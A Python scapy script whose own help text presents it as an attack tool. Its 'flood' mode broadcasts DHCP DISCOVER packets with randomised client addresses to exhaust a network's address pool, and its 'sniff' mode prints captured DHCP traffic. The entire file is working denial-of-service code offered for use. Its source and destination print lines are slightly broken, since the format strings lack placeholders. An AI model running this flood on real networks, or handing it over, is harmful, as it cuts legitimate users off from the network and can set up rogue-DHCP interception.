#!/usr/bin/env python3

import argparse
import logging
import string

# Quiet scapy
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

from scapy.all import *

def dhcp_flood(**kwargs):
    iface = kwargs["interface"]
    count = kwargs["count"]

    unique_hexdigits = str.encode("".join(set(string.hexdigits.lower())))
    packet = (Ether(dst="ff:ff:ff:ff:ff:ff")/
        IP(src="0.0.0.0", dst="255.255.255.255")/
        UDP(sport=68, dport=67)/
        BOOTP(chaddr=RandString(12, unique_hexdigits))/
        DHCP(options=[("message-type", "discover"), "end"])
    )

    sendp(
        packet,
        iface=iface,
        count=count
    )

def print_dhcp_response(response):
    print("Source: ".format(response[Ether].src))
    print("Destination: ".format(response[Ether].dst))

    for o in response[DHCP].options:
        if o in ["end", "pad"]:
            break
        print("Option: {}".format(o))

def dhcp_sniff(**kwargs):
    sniff(filter="udp and (port 67 or 68)", prn=print_dhcp_response)

def parse_args():
    p = argparse.ArgumentParser(description=
        '''
        All your IPs are belong to us.
        ''', formatter_class=argparse.RawTextHelpFormatter)

    p.add_argument('-i', '--interface', action='store',
        default=conf.iface,
        help='network interface to use')

    subparsers = p.add_subparsers(dest='command')
    subparsers.required = True

    flood = subparsers.add_parser('flood')
    flood.add_argument('-c', '--count', action='store',
        default=10, type=int,
        help='number of address to consume')

    sniff = subparsers.add_parser('sniff')

    args = p.parse_args()
    return args

def main():
    args = parse_args()

    dispatch = {
        "flood": dhcp_flood,
        "sniff": dhcp_sniff,
    }

    dispatch[args.command](**vars(args))

if __name__ == "__main__":
    main()
